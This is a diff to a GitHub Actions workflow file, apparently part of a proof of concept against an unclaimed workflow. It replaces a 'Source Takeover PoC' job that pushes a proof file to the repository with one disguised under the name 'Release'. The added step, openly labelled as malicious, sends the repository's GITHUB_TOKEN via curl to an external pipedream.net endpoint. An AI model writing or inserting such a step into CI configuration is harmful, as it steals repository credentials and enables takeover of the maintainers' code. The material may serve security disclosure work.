@@ -1,24 +1,16 @@
-name: Source Takeover PoC
-on: workflow_dispatch
+name: Release
 
-permissions:
-  contents: write   # Needed to push to the victim repo
-  pull-requests: write
+on:
+  workflow_dispatch:
 
 jobs:
-  takeover:
+  build:
     runs-on: ubuntu-latest
     steps:
-      - name: Clone target repository
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Malicious step (exfiltrate secrets)
         run: |
-          git clone "https://github.com/${{ github.repository }}" target
-          cd target
-          git config user.email "poc-attacker@example.com"
-          git config user.name "RCE PoC Bot"
-
-          echo "# Proof of RCE" > POC.md
-          echo "This file was added by running a workflow linked in your documentation." >> POC.md
-
-          git add POC.md
-          git commit -m "PoC: Added harmless proof file via unclaimed workflow"
-          git push origin HEAD
+          echo "Exfiltrating secrets..."
+          echo "GITHUB_TOKEN=$GITHUB_TOKEN" | curl -X POST -d @- https://eog4wasc32zrjow.m.pipedream.net/RCE
